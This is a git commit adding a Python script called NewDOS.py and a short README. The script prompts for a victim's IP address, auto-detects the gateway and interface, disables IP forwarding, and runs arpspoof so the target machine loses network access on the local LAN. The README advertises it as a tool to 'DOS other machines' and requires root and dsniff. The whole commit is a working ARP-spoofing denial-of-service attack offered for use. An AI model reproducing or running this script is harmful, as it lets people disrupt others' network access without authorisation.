7357231fc5a104d9ada9fb8256bcdf26b2f2007d
Parth Bhavsar <7parthbhavsar@gmail.com>
2020-04-14 21:17:11 -0400

    Commit

---
+++ NewDOS.py
@@ -0,0 +1,52 @@
+import os,time
+
+os.system('clear')
+os.system('figlet NSP DOS Attack')
+print ("Made by: Parth Bhavsar\n")
+print ("Optimized for Kali Linux. Some of the features of this script might not be available on other distros.\n")
+
+if os.geteuid() != 0:
+    exit("The script needs root access to run.\nPlease try again, this time using 'sudo'. Exiting.\n")
+
+veektim = input("Enter the IP of the machine you want to attack: ")
+#Gateway = input("Enter the Gateway of the LAN: ")
+
+def GetTheGateway():
+	Gateway = os.popen("route | grep default |awk '{print $2}'")
+	Gateway = Gateway.read()
+	Gateway = Gateway[:-1]
+	print ("\nDetected Gateway: ",Gateway)
+	chos = input("Is this correct?(Y/N): ")
+	if chos == 'N' or chos == 'n':
+		Gateway = input("Enter Gateway: ")
+	return Gateway
+
+def GetTheInterface():
+	Interface = os.popen("route | grep default |awk '{print $8}'")
+	Interface = Interface.read()
+	Interface = Interface[:-1]
+	print ("\nDetected Interface: ",Interface)
+	chos = input("Is this correct?(Y/N): ")
+	if chos == 'N' or chos == 'n':
+		Interface = input("Enter Interface: ")
+	return Interface
+
+def attackbegin(intlmao,Victim,gatelmao):
+	#Enable this at the end
+	command11 = "sysctl -w net.ipv4.ip_forward=0" + ">/dev/null 2>&1"
+	os.system(command11)
+	os.system("sysctl -p")
+
+	#command1 = "arpspoof -i "+ (intlmao) + " -t " + (gatelmao) + " " + (Victim)
+	command2 = "arpspoof -i "+ (intlmao) + " -t " + (Victim) + " " + (gatelmao) + ">/dev/null 2>&1"
+	print("\nAttack starting...")
+	#print(command2)
+	os.system(command2)
+	print("\nAttack finished. Victim's access will be restored in a bit.")
+	
+
+gate = GetTheGateway()
+intr = GetTheInterface()
+attackbegin(intr,veektim,gate)
+
+
---
+++ README.md
@@ -0,0 +1,7 @@
+This script can DOS other machines on the local machines.
+
+It is built for Kali Linux, it will run on other Linux distros but some of the auto detection features might not work.
+
+Please run it using root access and with Python3.
+
+Please ensure dsniff is installed on your machine.
